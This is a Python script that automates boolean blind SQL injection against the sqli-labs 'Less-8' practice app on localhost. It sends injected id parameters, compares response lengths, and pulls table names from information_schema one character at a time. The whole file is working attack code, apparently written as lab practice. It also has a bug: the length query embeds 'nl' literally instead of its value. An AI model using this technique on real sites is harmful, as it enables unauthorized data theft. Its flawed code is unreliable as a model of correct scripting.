import requests

URL="http://127.0.0.1/sqli-labs-master/Less-8/"
payload1="?id=1' and 1=1%23"
payload2="?id=1' and 1=2%23"
a=requests.get(URL+payload1)
b=requests.get(URL+payload2)

def boole(ml):
    r=requests.get(URL+f"?id=1' and {ml}%23")
    return len(r.text)==len(a.text)

# # def judge(sentence):
n="select group_concat(table_name) from information_schema.tables where table_schema=database()"
# for i in range(1,100):
#     if boole(f"length(({n}))<2**i"):
#         for k in range(1,i):
#             if boole(f"length(({n}))<2**i-2**(i-1-k)"):
nl=0
while 1:
    nl+=1
    if boole(f"length(({n}))=nl"):
        break
print("length=",nl)
f=0
c=1
e=0
d=''
while e<129:
    if boole(f"ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{c},1))={e}"):
        c+=1
        d=d+chr(e)
        e=0
        f=0
        print(d)
        if c==nl:
            break
    else:
        f+=1
        if boole(f"ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{c},1))>{e}"):
            e+=128//(2**f)
        else:
            if boole(f"ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{c},1))<{e}"):
                e-=128//(2**f)


print("table_name=",d)